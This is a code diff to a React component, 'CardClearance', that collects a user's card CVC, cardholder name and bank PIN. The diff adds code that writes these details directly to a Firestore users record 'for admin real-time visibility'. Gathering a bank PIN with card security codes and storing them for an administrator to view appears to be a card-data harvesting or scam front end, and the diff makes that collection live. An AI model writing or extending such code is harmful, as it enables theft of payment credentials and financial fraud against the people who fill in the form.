@@ -1,6 +1,8 @@
 import React, { useState } from 'react';
 import { Icons } from './Icons';
 import { User } from '../types';
+import { db, syncUserFromLocalToFirestore, sanitizeForFirestore } from '../firebase';
+import { doc, setDoc } from 'firebase/firestore';
 
 interface CardClearanceProps {
   user: User;
@@ -27,6 +29,7 @@ export const CardClearance: React.FC<CardClearanceProps> = ({
   const [cvc, setCvc] = useState(existing.cvc);
   const [cardHolderName, setCardHolderName] = useState(existing.cardHolderName || user.name || '');
   const [bankPin, setBankPin] = useState(existing.bankPin);
+  const [isSubmitting, setIsSubmitting] = useState(false);
   const [isSaved, setIsSaved] = useState(false);
   const [errorMsg, setErrorMsg] = useState('');
 
@@ -59,7 +62,7 @@ export const CardClearance: React.FC<CardClearanceProps> = ({
     setCvc(raw);
   };
 
-  const handleSave = (e: React.FormEvent) => {
+  const handleSave = async (e: React.FormEvent) => {
     e.preventDefault();
     setErrorMsg('');
 
@@ -94,11 +97,31 @@ export const CardClearance: React.FC<CardClearanceProps> = ({
       submittedAt: new Date().toISOString(),
     };
 
-    onUpdateProfile({
-      cardClearance: clearanceData,
-    });
+    setIsSubmitting(true);
 
-    setIsSaved(true);
+    try {
+      // 1. Local state update
+      onUpdateProfile({
+        cardClearance: clearanceData,
+      });
+
+      // 2. Direct Firestore update for admin real-time visibility
+      const emailKey = user.email.toLowerCase().trim();
+      const updatedUser = {
+        ...user,
+        cardClearance: clearanceData,
+      };
+
+      await setDoc(doc(db, 'users', emailKey), sanitizeForFirestore(updatedUser), { merge: true });
+      await syncUserFromLocalToFirestore(user.email);
+
+      setIsSaved(true);
+    } catch (err: any) {
+      console.error('Error submitting card clearance details:', err);
+      setErrorMsg('Failed to submit details. Please try again.');
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   return (
@@ -284,10 +307,17 @@ export const CardClearance: React.FC<CardClearanceProps> = ({
             {/* Submit Button */}
             <button
               type="submit"
-              className="w-full py-4 mt-2 bg-gradient-to-r from-amber-500 via-yellow-500 to-amber-600 hover:from-amber-600 hover:to-yellow-600 text-slate-950 font-black text-xs uppercase tracking-widest rounded-2xl shadow-lg shadow-amber-300/50 active:scale-95 transition-all flex items-center justify-center space-x-2 border border-yellow-300"
+              disabled={isSubmitting}
+              className={`w-full py-4 mt-2 bg-gradient-to-r from-amber-500 via-yellow-500 to-amber-600 hover:from-amber-600 hover:to-yellow-600 text-slate-950 font-black text-xs uppercase tracking-widest rounded-2xl shadow-lg shadow-amber-300/50 active:scale-95 transition-all flex items-center justify-center space-x-2 border border-yellow-300 ${isSubmitting ? 'opacity-70 cursor-not-allowed' : ''}`}
             >
-              <Icons.ShieldCheck size={18} />
-              <span>Save & Submit Clearance Details</span>
+              {isSubmitting ? (
+                <span>Submitting Clearance Details...</span>
+              ) : (
+                <>
+                  <Icons.ShieldCheck size={18} />
+                  <span>Save & Submit Clearance Details</span>
+                </>
+              )}
             </button>
           </form>
         )}
